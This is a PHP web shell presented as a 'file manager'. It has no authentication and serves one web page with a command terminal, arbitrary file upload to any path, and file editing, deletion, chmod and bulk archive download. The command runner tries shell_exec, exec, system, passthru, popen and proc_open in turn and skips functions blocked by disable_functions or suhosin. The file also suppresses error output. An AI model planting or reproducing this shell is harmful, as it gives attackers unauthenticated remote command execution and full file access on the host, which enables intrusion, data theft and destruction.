<?php
@ini_set('display_errors','0');@ini_set('log_errors','1');@error_reporting(0);
if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir(){foreach(array('TMP','TMPDIR','TEMP') as $k)if(!empty($_ENV[$k]))return realpath($_ENV[$k]);$t=@tempnam(uniqid(rand(),true),'');if($t){$d=realpath(dirname($t));@unlink($t);return $d;}return '/tmp';}}
if(!defined('DIRECTORY_SEPARATOR'))define('DIRECTORY_SEPARATOR',strtoupper(substr(PHP_OS,0,3))==='WIN'?'\\':'/');
function xa_post($k,$d=null){return isset($_POST[$k])?$_POST[$k]:$d;}
function xa_get($k,$d=null){return isset($_GET[$k])?$_GET[$k]:$d;}
@ini_set('session.save_handler','files');
$sp=sys_get_temp_dir().DIRECTORY_SEPARATOR.'php_sessions';
if(!@is_dir($sp))@mkdir($sp,0700,true);
if(@is_dir($sp)&&@is_writable($sp))@ini_set('session.save_path',$sp);
if(function_exists('session_status')){if(session_status()!==PHP_SESSION_ACTIVE)@session_start();}else @session_start();
if(!isset($_SESSION))$_SESSION=array();
if(!isset($_SESSION['current_dir'])||!@is_dir($_SESSION['current_dir'])){$c=@getcwd();$_SESSION['current_dir']=$c===false?dirname(__FILE__):$c;}
if(!empty($_GET['upload_file'])&&!empty($_GET['name'])){
 $td=$_GET['upload_file'];$fn=basename($_GET['name']);
 if(strpbrk($fn,'/\\')!==false||strpos($fn,'..')!==false){header($_SERVER['SERVER_PROTOCOL'].' 400 Bad Request');exit('Invalid filename');}
 if(!@is_dir($td))@mkdir($td,0755,true);
 if(!@is_dir($td)||!@is_writable($td)){header($_SERVER['SERVER_PROTOCOL'].' 400 Bad Request');exit('Invalid directory');}
 $up=rtrim($td,'/\\').DIRECTORY_SEPARATOR.$fn;$ih=@fopen('php://input','rb');$fh=@fopen($up,'wb');
 if($ih&&$fh){while(!feof($ih)){$b=fread($ih,8192);if($b===false||$b==='')break;fwrite($fh,$b);}fclose($ih);fclose($fh);@chmod($up,0644);header($_SERVER['SERVER_PROTOCOL'].' 200 OK');exit('File uploaded successfully');}
 header($_SERVER['SERVER_PROTOCOL'].' 500 Internal Server Error');exit('Upload failed');
}
function validatePath($p){$r=@realpath($p);if($r!==false&&(@is_file($r)||@is_dir($r)))return $r;return(@file_exists($p)&&(@is_file($p)||@is_dir($p)))?$p:false;}
function sanitizeFileName($n){$n=preg_replace('/[^a-zA-Z0-9._-]/','_',basename($n));return(empty($n)||$n==='.'||$n==='..')?false:$n;}
function formatFileSize($b){foreach(array(1073741824=>'GB',1048576=>'MB',1024=>'KB') as $s=>$u)if($b>=$s)return number_format($b/$s,2).' '.$u;return $b>1?$b.' bytes':($b==1?'1 byte':'0 bytes');}
function getFileExtension($f){$e=strtolower(pathinfo($f,PATHINFO_EXTENSION));return $e?strtoupper($e):'';}
$notification='';$errorMsg='';
function isFunctionAvailable($f){if(!function_exists($f))return false;foreach(array('disable_functions','suhosin.executor.func.blacklist') as $i){$d=@ini_get($i);if($d&&in_array(strtolower($f),array_map('trim',explode(',',strtolower($d)))))return false;}return true;}
function runCommand($cmd){
 $cmd=trim($cmd);if($cmd==='')return "No command provided";$c=$cmd.' 2>&1';
 if(isFunctionAvailable('shell_exec')){$r=@shell_exec($c);if($r!==null&&$r!==false)return $r;}
 if(isFunctionAvailable('exec')){$o=array();@exec($c,$o);if($o)return implode("\n",$o);}
 foreach(array('system','passthru') as $fn)if(isFunctionAvailable($fn)){ob_start();@$fn($c);$r=ob_get_clean();if($r!==false&&$r!=='')return $r;}
 if(isFunctionAvailable('popen')){$h=@popen($c,'r');if($h){$r='';while(!feof($h))$r.=fread($h,4096);pclose($h);if($r!=='')return $r;}}
 if(isFunctionAvailable('proc_open')){$d=array(1=>array('pipe','w'),2=>array('pipe','w'));$p=@proc_open($cmd,$d,$pp);if(is_resource($p)){$r=stream_get_contents($pp[1]).stream_get_contents($pp[2]);fclose($pp[1]);fclose($pp[2]);proc_close($p);if($r!=='')return $r;}}
 return "Command execution not available";
}
function xa_recursive_delete($p){if(@is_file($p)||@is_link($p))return @unlink($p);if(!@is_dir($p))return false;$it=@scandir($p);if($it===false)return false;foreach($it as $i)if($i!=='.'&&$i!=='..')xa_recursive_delete($p.DIRECTORY_SEPARATOR.$i);return @rmdir($p);}
function xa_walk_dir($dir,&$out,$base=''){$it=@scandir($dir);if($it===false)return;foreach($it as $i){if($i==='.'||$i==='..')continue;$f=$dir.DIRECTORY_SEPARATOR.$i;$r=$base===''?$i:$base.'/'.$i;if(@is_dir($f)){$out[]=array('type'=>'dir','path'=>$f,'rel'=>$r);xa_walk_dir($f,$out,$r);}else $out[]=array('type'=>'file','path'=>$f,'rel'=>$r);}}
function xa_build_archive($items,$baseDir,$np){
 $tmp=sys_get_temp_dir();
 if(class_exists('ZipArchive')){
  $zn=$np.'_'.time().'.zip';$zp=$tmp.DIRECTORY_SEPARATOR.$zn;$z=new ZipArchive();
  if($z->open($zp,ZipArchive::CREATE|ZipArchive::OVERWRITE)===TRUE){
   foreach($items as $tp){if(!$tp)continue;
    if(@is_file($tp))$z->addFile($tp,basename($tp));
    elseif(@is_dir($tp)){$bs=basename($tp);$lst=array();xa_walk_dir($tp,$lst);$z->addEmptyDir($bs);foreach($lst as $e)$e['type']==='dir'?$z->addEmptyDir($bs.'/'.$e['rel']):$z->addFile($e['path'],$bs.'/'.$e['rel']);}
   }$z->close();return array($zp,$zn,'application/zip');
  }return false;
 }
 if(isFunctionAvailable('shell_exec')||isFunctionAvailable('exec')){
  $tn=$np.'_'.time().'.tar.gz';$tp=$tmp.DIRECTORY_SEPARATOR.$tn;$args='';
  foreach($items as $x)if($x)$args.=' '.escapeshellarg(basename($x));
  $cmd='cd '.escapeshellarg($baseDir).' && tar -czf '.escapeshellarg($tp).$args.' 2>&1';
  isFunctionAvailable('shell_exec')?@shell_exec($cmd):@exec($cmd);
  if(@is_file($tp)&&@filesize($tp)>0)return array($tp,$tn,'application/gzip');
 }return false;
}
function xa_send($p,$n,$m){while(@ob_get_level()>0)@ob_end_clean();header('Content-Type: '.$m);header('Content-Disposition: attachment; filename="'.$n.'"');header('Content-Length: '.@filesize($p));@readfile($p);}
$cd=&$_SESSION['current_dir'];
if(isset($_POST['bulk_delete'],$_POST['selected_items'])&&is_array($_POST['selected_items'])){
 $del=0;$fail=0;
 foreach($_POST['selected_items'] as $it){$tp=validatePath($cd.DIRECTORY_SEPARATOR.$it);if($tp===false){$fail++;continue;}if(xa_recursive_delete($tp))$del++;else $fail++;}
 if($del>0){$notification="Deleted $del item(s)";if($fail>0)$notification.=" (Failed: $fail)";}elseif($fail>0)$errorMsg="Failed to delete $fail item(s)";
}
if(isset($_POST['bulk_download'],$_POST['selected_items'])&&is_array($_POST['selected_items'])){
 $paths=array();foreach($_POST['selected_items'] as $it){$p=validatePath($cd.DIRECTORY_SEPARATOR.$it);if($p!==false)$paths[]=$p;}
 $a=xa_build_archive($paths,$cd,'selected_files');
 if($a!==false){xa_send($a[0],$a[1],$a[2]);@unlink($a[0]);exit;}
 $errorMsg='Bulk download failed: archive tools unavailable on this server';
}
if(isset($_POST['navigate'])){$td=$_POST['navigate'];if(@is_dir($td)){$cd=validatePath($td);$notification='Directory changed successfully';}}
if(isset($_FILES['file_upload'])&&$_FILES['file_upload']['error']!==UPLOAD_ERR_NO_FILE){
 $F=$_FILES['file_upload'];
 if($F['error']===UPLOAD_ERR_OK){
  $fn=basename($F['name']);$up=rtrim($cd,'/\\').DIRECTORY_SEPARATOR.$fn;
  if(strpbrk($fn,'/\\')!==false||strpos($fn,'..')!==false)$errorMsg='Upload failed: Invalid filename';
  elseif(!@is_writable($cd))$errorMsg='Upload failed: Directory not writable';
  else{$m=function_exists('move_uploaded_file')?@move_uploaded_file($F['tmp_name'],$up):false;if(!$m){$m=@copy($F['tmp_name'],$up);if($m)@unlink($F['tmp_name']);}if($m){@chmod($up,0644);$notification='File uploaded successfully';}else $errorMsg='Upload failed: Could not move file. Check directory permissions.';}
 }else{
  $ue=array(UPLOAD_ERR_INI_SIZE=>'File exceeds upload_max_filesize',UPLOAD_ERR_FORM_SIZE=>'File exceeds MAX_FILE_SIZE',UPLOAD_ERR_PARTIAL=>'File partially uploaded',UPLOAD_ERR_NO_TMP_DIR=>'Missing temporary folder',UPLOAD_ERR_CANT_WRITE=>'Failed to write file to disk',UPLOAD_ERR_EXTENSION=>'Upload stopped by extension');
  $errorMsg='Upload error: '.(isset($ue[$F['error']])?$ue[$F['error']]:'Unknown error');
 }
}
if(isset($_POST['remove'])){
 $tp=validatePath($cd.DIRECTORY_SEPARATOR.$_POST['remove']);
 if($tp===false)$errorMsg='Delete failed: Invalid path';
 elseif(@is_file($tp))$notification=@unlink($tp)?'File deleted':($errorMsg='Delete failed: Permission denied or file in use');
 elseif(@is_dir($tp))$notification=xa_recursive_delete($tp)?'Directory deleted':($errorMsg='Delete failed: Could not remove directory');
 else $errorMsg='Delete failed: Path not found';
}
if(isset($_POST['old_name'],$_POST['new_name'])){
 $sp=validatePath($cd.DIRECTORY_SEPARATOR.$_POST['old_name']);
 if($sp===false)$errorMsg='Rename failed: Source not found';
 else{$dp=dirname($sp).DIRECTORY_SEPARATOR.basename($_POST['new_name']);$errorMsg=@file_exists($dp)?'Rename failed: Target name already exists':(@rename($sp,$dp)?($notification='Rename successful')&&'':'Rename failed: Permission denied or invalid name');}
}
if(isset($_POST['file_to_edit'],$_POST['file_content'])){
 $ep=validatePath($cd.DIRECTORY_SEPARATOR.$_POST['file_to_edit']);
 if($ep===false||!@is_file($ep))$errorMsg='Edit failed: File not found';
 elseif(!@is_writable($ep))$errorMsg='Edit failed: File not writable';
 elseif(@file_put_contents($ep,$_POST['file_content'])!==false)$notification='File saved';
 else $errorMsg='Edit failed: Could not write to file';
}
if(isset($_POST['chmod_item'],$_POST['chmod_value'])){
 $tp=validatePath($cd.DIRECTORY_SEPARATOR.$_POST['chmod_item']);
 if($tp===false)$errorMsg='Chmod failed: Invalid path';
 elseif(@chmod($tp,octdec($_POST['chmod_value'])))$notification='Permissions changed successfully';
 else $errorMsg='Chmod failed: Permission denied';
}
foreach(array('create_file'=>array('file','file_put_contents','File'),'create_folder'=>array('folder','mkdir','Folder')) as $K=>$V){
 if(isset($_POST[$K])&&trim($_POST[$K])!==''){
  $fn=sanitizeFileName($_POST[$K]);
  if($fn===false)$errorMsg='Create failed: Invalid '.$V[0].' name';
  else{$np=$cd.DIRECTORY_SEPARATOR.$fn;if(@file_exists($np))$errorMsg='Create failed: '.$V[2].' already exists';elseif(!@is_writable($cd))$errorMsg='Create failed: Directory not writable';else{$ok=$K==='create_file'?(@file_put_contents($np,'')!==false):@mkdir($np,0755);if($ok){if($K==='create_file')@chmod($np,0644);$notification=$V[2].' created';}else $errorMsg='Create failed: Could not create '.$V[0];}}
 }
}
$currentDirectory=$cd;
$dc=@scandir($currentDirectory);
if($dc===false){$dc=array();$errorMsg=$errorMsg?:'Cannot read directory: '.$currentDirectory;}
$folders=array();$files=array();
foreach($dc as $i){if($i==='.')continue;@is_dir($currentDirectory.DIRECTORY_SEPARATOR.$i)?$folders[]=$i:$files[]=$i;}
sort($folders);sort($files);$allItems=array_merge($folders,$files);
$fileToEdit=xa_post('edit');$fileToView=xa_post('view');$itemToRename=xa_post('rename');$itemToChmod=xa_post('chmod');
$fileContent=$fileToEdit?@file_get_contents($currentDirectory.DIRECTORY_SEPARATOR.$fileToEdit):null;
$viewContent=$fileToView?@file_get_contents($currentDirectory.DIRECTORY_SEPARATOR.$fileToView):null;
if(isset($_POST['download'])){
 $tp=validatePath($cd.DIRECTORY_SEPARATOR.$_POST['download']);
 if($tp===false)$errorMsg='Download failed: Invalid path';
 elseif(@is_file($tp)){while(@ob_get_level()>0)@ob_end_clean();header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($tp).'"');$sz=@filesize($tp);if($sz!==false)header('Content-Length: '.$sz);$fp=@fopen($tp,'rb');if($fp){while(!feof($fp)){echo fread($fp,8192);@flush();}fclose($fp);}else @readfile($tp);exit;}
 elseif(@is_dir($tp)){$a=xa_build_archive(array($tp),dirname($tp),basename($tp));if($a!==false){xa_send($a[0],$a[1],$a[2]);@unlink($a[0]);exit;}$errorMsg='Download failed: archive tools unavailable on this server';}
}
$commandAvailable=false;$commandResult='';
foreach(array('shell_exec','exec','system','passthru','popen','proc_open') as $f)if(isFunctionAvailable($f)){$commandAvailable=true;break;}
if(isset($_POST['terminal_command'])&&trim($_POST['terminal_command'])!==''){$cmd=trim($_POST['terminal_command']);$oc=@getcwd();if(@is_dir($cd))@chdir($cd);$commandResult=@runCommand($cmd);if($oc)@chdir($oc);if(trim($commandResult)===''||$commandResult==="Command execution not available")$errorMsg='Command execution: No output or function disabled';}
function H($s){return htmlentities($s);}
?>
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>XANNYANAXIUM FILE MANAGER</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1a1b1e;color:#e4e6eb;font:13px/1.5 -apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;min-height:100vh;padding:20px}
.container{max-width:1400px;margin:0 auto}
h1{font-size:16px;font-weight:500;margin-bottom:4px}
.subtitle{color:#9ca3af;margin-bottom:20px}
.alert{padding:10px 12px;border-radius:4px;margin-bottom:12px;border:1px solid}
.alert-success{background:rgba(34,197,94,.1);border-color:rgba(34,197,94,.3);color:#22c55e}
.alert-danger{background:rgba(239,68,68,.1);border-color:rgba(239,68,68,.3);color:#ef4444}
.section{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:4px;padding:14px;margin-bottom:12px}
.section-title{font-weight:500;margin-bottom:10px}
.input-group{display:flex;gap:6px;margin-bottom:6px}
.input-group:last-child{margin-bottom:0}
input[type=text],input[type=file],textarea,select{background:rgba(0,0,0,.2);border:1px solid rgba(255,255,255,.1);border-radius:4px;padding:6px 10px;color:#e4e6eb;font:13px inherit;outline:0;flex:1;transition:.15s}
input[type=text]:focus,textarea:focus,select:focus{border-color:rgba(255,255,255,.2);background:rgba(0,0,0,.3)}
input[type=file]{cursor:pointer}
input[type=file]::file-selector-button{background:rgba(255,255,255,.06);color:#e4e6eb;border:1px solid rgba(255,255,255,.1);border-radius:4px;padding:6px 12px;cursor:pointer;margin-right:10px;transition:.15s}
input[type=file]::file-selector-button:hover{background:rgba(255,255,255,.1)}
textarea{font-family:'SF Mono',Monaco,Consolas,monospace;resize:vertical;min-height:400px;height:500px;font-size:12px;width:100%;display:block}
.btn{background:rgba(255,255,255,.06);color:#e4e6eb;border:1px solid rgba(255,255,255,.1);border-radius:4px;padding:6px 12px;font-size:13px;cursor:pointer;font:inherit;white-space:nowrap;transition:.15s}
.btn:hover{background:rgba(255,255,255,.1)}
.btn-primary,.btn-create{background:rgba(34,197,94,.15);color:#22c55e;border-color:rgba(34,197,94,.3)}
.btn-primary:hover,.btn-create:hover{background:rgba(34,197,94,.25)}
.btn-danger{background:rgba(239,68,68,.15);color:#ef4444;border-color:rgba(239,68,68,.3)}
.btn-danger:hover{background:rgba(239,68,68,.25)}
.btn-sm{padding:4px 10px;font-size:12px}
table{width:100%;border-collapse:collapse;border:1px solid rgba(255,255,255,.08);border-radius:4px;overflow:hidden;table-layout:fixed}
thead{background:rgba(255,255,255,.03)}
th{padding:8px 12px;font-weight:500;text-align:left;color:#9ca3af;font-size:12px;border-bottom:1px solid rgba(255,255,255,.08);white-space:nowrap}
td{padding:8px 12px;border-top:1px solid rgba(255,255,255,.05);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
tbody tr:hover{background:rgba(255,255,255,.03)}
.file-icon{display:inline-block;width:14px;text-align:center;margin-right:6px;opacity:.6;font-size:11px}
.file-name{color:#e4e6eb;cursor:pointer;text-decoration:none;display:inline-block;max-width:100%;overflow:hidden;text-overflow:ellipsis}
.file-name:hover{color:#22c55e;text-decoration:underline}
.file-size,.file-date,.file-type{color:#9ca3af;font-size:12px}
.file-size,.file-date{font-family:'SF Mono',Monaco,Consolas,monospace}
.file-size{text-align:right}.file-date{text-align:center}
.writable{color:#22c55e;font-size:12px}.readonly{color:#ef4444;font-size:12px}
.action-buttons{display:flex;gap:4px;flex-wrap:wrap;justify-content:flex-end}
.action-buttons form{margin:0}.action-buttons .btn{padding:4px 8px;font-size:12px}
.rename-form,.chmod-form{display:flex;gap:6px;align-items:center}
.rename-form input{flex:1;padding:4px 8px}
.chmod-form input{width:80px;padding:4px 8px;text-align:center}
.terminal-output{background:rgba(0,0,0,.3);border:1px solid rgba(34,197,94,.3);border-radius:4px;padding:12px;font-family:'SF Mono',Monaco,Consolas,monospace;font-size:12px;color:#22c55e;overflow-x:auto;white-space:pre}
.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
@media(max-width:768px){.grid-2{grid-template-columns:1fr}body{padding:12px}.action-buttons{justify-content:flex-start}}
.up-btn{margin-bottom:12px;display:inline-flex;align-items:center;gap:6px}
.bulk-actions{display:flex;gap:8px;align-items:center;margin-bottom:12px;padding:12px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:4px}
.bulk-actions-text{color:#9ca3af;margin-right:auto}
input[type=checkbox]{appearance:none;-webkit-appearance:none;width:16px;height:16px;border:1px solid rgba(255,255,255,.2);border-radius:3px;background:rgba(0,0,0,.3);cursor:pointer;position:relative}
input[type=checkbox]:checked{background:rgba(34,197,94,.2);border-color:#22c55e}
input[type=checkbox]:checked::after{content:'\2713';position:absolute;top:-1px;left:2px;color:#22c55e;font-size:12px;font-weight:bold}
td input[type=checkbox]{margin-right:8px}
.upload-tabs{display:flex;margin-bottom:10px;border-bottom:1px solid rgba(255,255,255,.1)}
.upload-tab{padding:8px 12px;cursor:pointer;border-bottom:2px solid transparent}
.upload-tab.active{border-bottom-color:#22c55e;color:#22c55e}
.upload-panel{display:none}.upload-panel.active{display:block}
.modal{display:none;position:fixed;z-index:1000;inset:0;background:rgba(0,0,0,.7)}
.modal-content{background:#2a2d35;margin:10% auto;padding:20px;border-radius:8px;width:400px;max-width:90%;border:1px solid rgba(255,255,255,.1)}
.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px}
.modal-title{font-size:16px;font-weight:500}
.close{color:#9ca3af;font-size:24px;font-weight:bold;cursor:pointer;line-height:1}
.close:hover{color:#e4e6eb}
.chmod-options{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:15px}
.chmod-group{text-align:center}
.chmod-group label{display:block;margin-bottom:5px;font-size:12px;color:#9ca3af}
</style>
<script>
var $=function(i){return document.getElementById(i)},Q=function(s){return document.querySelectorAll(s)},PERM=['owner_read','owner_write','owner_execute','group_read','group_write','group_execute','other_read','other_write','other_execute'];
function toggleSelectAll(c){Q('input[name="selected_items[]"]').forEach(function(b){b.checked=c.checked});updateBulkActions();}
function updateBulkActions(){var n=Q('input[name="selected_items[]"]:checked').length,b=$('bulk-actions');b.style.display=n?'flex':'none';if(n)$('selected-count').textContent=n+' item(s) selected';}
function switchUploadTab(id){Q('.upload-panel').forEach(function(p){p.classList.remove('active')});Q('.upload-tab').forEach(function(t){t.classList.remove('active')});$(id+'-panel').classList.add('active');$(id+'-tab').classList.add('active');}
function uploadFile(){var fi=$('upload_files'),s=$('upload_status');if(!fi.files||!fi.files.length){s.textContent="No file selected";s.style.color="red";return;}var f=fi.files[0],fn=f.name,cd="<?= addslashes($cd) ?>";s.textContent="Uploading "+fn+"...";s.style.color="blue";var r=new FileReader();r.readAsBinaryString(f);r.onloadend=function(e){var x=new XMLHttpRequest();x.open("POST",location.pathname+"?upload_file="+encodeURIComponent(cd)+"&name="+encodeURIComponent(fn),true);XMLHttpRequest.prototype.mySendAsBinary=function(t){var d=new ArrayBuffer(t.length),u=new Uint8Array(d,0);for(var i=0;i<t.length;i++)u[i]=t.charCodeAt(i)&0xff;var b;if(typeof window.Blob=="function")b=new Blob([d]);else{var bb=new(window.MozBlobBuilder||window.WebKitBlobBuilder||window.BlobBuilder)();bb.append(d);b=bb.getBlob();}this.send(b);};x.onreadystatechange=function(){if(x.readyState==4){if(x.status==200){s.textContent="File "+fn+" uploaded successfully!";s.style.color="#22c55e";setTimeout(function(){location.reload()},1000);}else{s.textContent="Upload failed: "+x.responseText;s.style.color="red";}}};x.mySendAsBinary(e.target.result);};}
function openChmodModal(n){$('chmodModal').style.display='block';$('chmodItem').value=n;updateChmodDisplay($('currentPerms_'+n.replace(/[^a-zA-Z0-9]/g,'_')).value);}
function closeChmodModal(){$('chmodModal').style.display='none';}
function updateChmodDisplay(p){$('chmodOctal').value=p;var b=parseInt(p,8).toString(2).padStart(9,'0');for(var i=0;i<9;i++)$(PERM[i]).checked=b[i]==='1';}
function updateChmodFromCheckboxes(){var b='';for(var i=0;i<9;i++)b+=$(PERM[i]).checked?'1':'0';$('chmodOctal').value=parseInt(b,2).toString(8).padStart(3,'0');}
function setPresetChmod(p){updateChmodDisplay(p);}
window.onclick=function(e){var m=$('chmodModal');if(e.target==m)m.style.display='none';};
</script></head><body><div class="container">
<h1>XANNYANAXIUM FILE MANAGER</h1><p class="subtitle">Navigate and manage your files</p>
<?php if($notification):?><div class="alert alert-success"><?=H($notification)?></div><?php endif;?>
<?php if($errorMsg):?><div class="alert alert-danger"><?=H($errorMsg)?></div><?php endif;?>
<div class="section"><div class="section-title">Current Directory</div><form method="post" class="input-group"><input type="text" name="navigate" value="<?=H($currentDirectory)?>" placeholder="Enter path..."><button class="btn" type="submit">Navigate</button></form></div>
<div class="grid-2">
<div class="section"><div class="section-title">Upload File</div>
<div class="upload-tabs"><div id="standard-tab" class="upload-tab active" onclick="switchUploadTab('standard')">Standard Upload</div><div id="advanced-tab" class="upload-tab" onclick="switchUploadTab('advanced')">Advanced Upload</div></div>
<div id="standard-panel" class="upload-panel active"><form method="post" enctype="multipart/form-data"><div class="input-group"><input type="file" name="file_upload"><button class="btn btn-primary" type="submit">Upload</button></div></form></div>
<div id="advanced-panel" class="upload-panel"><div class="input-group"><input type="file" id="upload_files" name="upload_files" multiple><button class="btn btn-primary" onclick="uploadFile();return false;">Upload</button></div><p style="margin-top:8px;font-size:12px">Status: <span id="upload_status" style="color:#9ca3af">No file selected</span></p></div>
</div>
<div class="section"><div class="section-title">Create New</div>
<form method="post" class="input-group"><input type="text" name="create_file" placeholder="New file name..."><button class="btn btn-create" type="submit">File</button></form>
<form method="post" class="input-group"><input type="text" name="create_folder" placeholder="New folder name..."><button class="btn btn-create" type="submit">Folder</button></form>
</div></div>
<?php if($fileToView&&$viewContent!==null):?><div class="section"><div class="section-title">Viewing: <?=H($fileToView)?></div><textarea readonly><?=H($viewContent)?></textarea></div><?php endif;?>
<?php if($fileToEdit!==null):?><div class="section"><div class="section-title">Editing: <?=H($fileToEdit)?></div><form method="post"><input type="hidden" name="file_to_edit" value="<?=H($fileToEdit)?>"><textarea name="file_content"><?=H($fileContent)?></textarea><div style="margin-top:12px"><button class="btn btn-primary" type="submit">Save Changes</button></div></form></div><?php endif;?>
<?php if($commandAvailable):?><div class="section"><div class="section-title">Terminal</div><form method="post" class="input-group"><input type="text" name="terminal_command" placeholder="Enter command..."><button class="btn btn-create" type="submit">Execute</button></form><?php if($commandResult):?><div class="terminal-output" style="margin-top:12px"><?=H($commandResult)?></div><?php endif;?></div><?php endif;?>
<form method="post"><button name="navigate" value="<?=dirname($currentDirectory)?>" class="btn up-btn">&larr; Parent Directory</button></form>
<form method="post" id="file-form">
<div id="bulk-actions" class="bulk-actions" style="display:none"><span class="bulk-actions-text" id="selected-count">0 item(s) selected</span><button type="submit" name="bulk_download" class="btn btn-sm" onclick="return confirm('Download selected items as zip?')">Download Selected</button><button type="submit" name="bulk_delete" class="btn btn-danger btn-sm" onclick="return confirm('Delete all selected items?')">Delete Selected</button></div>
<table><thead><tr><th style="width:40px"><input type="checkbox" onclick="toggleSelectAll(this)"></th><th>Name</th><th style="width:120px">Type</th><th style="width:100px;text-align:right">Size</th><th style="width:160px;text-align:center">Modified</th><th style="width:80px;text-align:center">Permission</th><th style="text-align:right">Actions</th></tr></thead><tbody>
<?php foreach($allItems as $item):
$fp=$currentDirectory.'/'.$item;$rp=validatePath($fp);
if($rp!==false){$isD=@is_dir($rp);$cw=@is_writable($rp);$fs=$isD?0:@filesize($rp);$fm=@filemtime($rp);$pm=@substr(sprintf('%o',@fileperms($rp)),-4);}
else{$isD=@is_dir($fp);$cw=false;$fs=0;$fm=0;$pm='????';}
$sn=preg_replace('/[^a-zA-Z0-9]/','_',$item);$mh=md5($item);?>
<tr><td><input type="checkbox" name="selected_items[]" value="<?=H($item)?>" onclick="updateBulkActions()"></td><td>
<?php if($itemToRename===$item):?><form method="post" class="rename-form" style="margin:0"><input type="hidden" name="old_name" value="<?=H($item)?>"><input type="text" name="new_name" value="<?=H($item)?>"><button class="btn btn-primary btn-sm" type="submit">Save</button></form>
<?php elseif($itemToChmod===$item):?><form method="post" class="chmod-form" style="margin:0"><input type="hidden" name="chmod_item" value="<?=H($item)?>"><input type="text" name="chmod_value" value="<?=$pm?>" maxlength="3" placeholder="755"><button class="btn btn-primary btn-sm" type="submit">Set</button><button class="btn btn-sm" type="button" onclick="location.reload()">Cancel</button></form>
<?php else:?><span class="file-icon"><?=$isD?'/':''?></span><a href="#" class="file-name" onclick="$('<?=$isD?'navigate':'view'?>-form-<?=$mh?>').submit();return false"><?=H($item)?></a><form id="<?=$isD?'navigate':'view'?>-form-<?=$mh?>" method="post" style="display:none"><input type="hidden" name="<?=$isD?'navigate':'view'?>" value="<?=$isD?$fp:$item?>"></form><?php endif;?>
</td>
<td><span class="file-type"><?=$isD?'Directory':(getFileExtension($item)?:'File')?></span></td>
<td><span class="file-size"><?=$isD?'&mdash;':formatFileSize($fs)?></span></td>
<td><span class="file-date"><?=date('Y-m-d H:i:s',$fm)?></span></td>
<td style="text-align:center"><span class="<?=$cw?'writable':'readonly'?>"><?=$pm?></span></td>
<td><div class="action-buttons">
<?php if(!$isD):?><form method="post" style="display:inline"><input type="hidden" name="edit" value="<?=H($item)?>"><button type="submit" class="btn btn-sm">Edit</button></form><?php endif;?>
<form method="post" style="display:inline"><input type="hidden" name="rename" value="<?=H($item)?>"><button type="submit" class="btn btn-sm">Rename</button></form>
<form method="post" style="display:inline"><input type="hidden" name="chmod" value="<?=H($item)?>"><button type="submit" class="btn btn-sm">Chmod</button><input type="hidden" id="currentPerms_<?=$sn?>" value="<?=$pm?>"></form>
<form method="post" style="display:inline"><input type="hidden" name="download" value="<?=H($item)?>"><button type="submit" class="btn btn-sm">Download</button></form>
<form method="post" style="display:inline" onsubmit="return confirm('Are you sure you want to delete this item?')"><input type="hidden" name="remove" value="<?=H($item)?>"><button type="submit" class="btn btn-danger btn-sm">Delete</button></form>
</div></td></tr>
<?php endforeach;?>
</tbody></table></form></div>
<div id="chmodModal" class="modal"><div class="modal-content"><div class="modal-header"><span class="modal-title">Change Permissions</span><span class="close" onclick="closeChmodModal()">&times;</span></div>
<form method="post"><input type="hidden" id="chmodItem" name="chmod_item"><div class="chmod-options">
<?php foreach(array('owner'=>'Owner','group'=>'Group','other'=>'Other') as $k=>$lbl):?>
<div class="chmod-group"><label><?=$lbl?></label><div><input type="checkbox" id="<?=$k?>_read" onchange="updateChmodFromCheckboxes()"> R <input type="checkbox" id="<?=$k?>_write" onchange="updateChmodFromCheckboxes()"> W <input type="checkbox" id="<?=$k?>_execute" onchange="updateChmodFromCheckboxes()"> X</div></div>
<?php endforeach;?>
<div class="chmod-group"><label>Octal</label><div><input type="text" id="chmodOctal" name="chmod_value" maxlength="3" style="width:50px;text-align:center"></div></div>
</div>
<div style="margin-bottom:15px"><button type="button" class="btn btn-sm" onclick="setPresetChmod('755')">755</button> <button type="button" class="btn btn-sm" onclick="setPresetChmod('644')">644</button> <button type="button" class="btn btn-sm" onclick="setPresetChmod('777')">777</button></div>
<div><button type="submit" class="btn btn-primary">Apply Changes</button> <button type="button" class="btn" onclick="closeChmodModal()">Cancel</button></div>
</form></div></div>
</body></html>
